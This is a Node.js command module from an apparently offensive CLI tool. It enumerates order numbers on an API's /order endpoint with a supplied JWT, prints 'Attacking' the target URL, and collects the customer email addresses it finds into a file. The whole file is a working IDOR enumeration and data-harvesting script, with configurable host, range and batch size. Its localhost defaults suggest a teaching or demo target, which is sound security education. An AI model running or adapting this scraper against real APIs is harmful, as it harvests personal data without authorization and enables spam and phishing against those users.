const axios = require('axios');
const fs = require('fs');
const ProgressBar = require('progress');

const Command = require('./command');

class Orders extends Command {
  constructor() {
    super(
      'orders',
      'Enumerates order numbers between a minimum and maximum value and collects unique email addresses from the orders.',
      [
        [ '<tokenfile>', 'A file with a valid JWT token.'],
        [ '<outfile>', 'The file to write the discovered email addresses to.']
      ],
      [
        [ '-h', '--host <host>', 'The hostname for the API endpoint. Default is localhost.'],
        [ '-p', '--port <port>', 'The port for the API endpoint. Default is 3333.'],
        [ '-s', '--https', 'Use https for the connection.'],
        [ '-b', '--batchSize <size>', 'Batch size for requests. Default is 10.'],
        [ '-l', '--lower <lower>', 'Lower value for order number range. Default is 1.'],
        [ '-u', '--upper <upper>', 'Upper value for order number range. Default is 5000.']
      ]
    );
  }

  async action(file, out, options) {
    const host = options.host ? options.host : 'localhost';
    const port = options.port ? options.port : '3333';
    const protocol = options.https ? 'https' : 'http'
    const url = `${protocol}://${host}:${port}/order`;

    console.log(`Attacking ${url}`);

    const start = new Date();
    const batchSize = options.batchSize ? parseInt(options.batchSize) : 10;
    const lower = options.lower ? parseInt(options.lower) : 1;
    const upper = options.upper ? parseInt(options.upper) : 5000;

    const output = out ? out : 'emails.txt';
    const token = fs.readFileSync(file);

    const bar = new ProgressBar('[:bar] :percent :etas', {
      complete: '=',
      incomplete: ' ',
      width: 50,
      total: (upper - lower),
      renderThrottle: 100
    });
    
    let count = 0;
    const emails = [];
    const batch = [];
    for (let i = lower; i <= upper; i++) {
      batch.push(i);

      if (batch.length == batchSize || i == upper) {
        await Promise.all(batch.map(async (number) => {
          try {
            return axios.get(
                `${url}/${number}`,
                { 
                  headers: {
                    Authorization: `Bearer ${token}`
                  },
                  validateStatus: () => true 
                }
              ).then((res) => {
                bar.tick();
                if (res.status == 200) {
                  count++;
                  const email = res.data.user.email;
                  if (!emails.includes(email))
                    emails.push(email);
                }
              });
          } catch (err) {
            console.log(err);
          }
        }));
        
        // clear batch
        batch.length = 0;
      }
    }
    
    console.log(`\nDuration: ${(new Date() - start) / 1000} secs`);
    console.log(`Exctracted ${emails.length} email addresses from ${count} orders\n`);

    if (fs.existsSync(output))
      fs.rmSync(output);
      
    emails.map((email) => {
      fs.appendFileSync(output, `${email}\n`, (err) => {
        if (err) console.log(err);
      })
    });
  }
}

module.exports = Orders;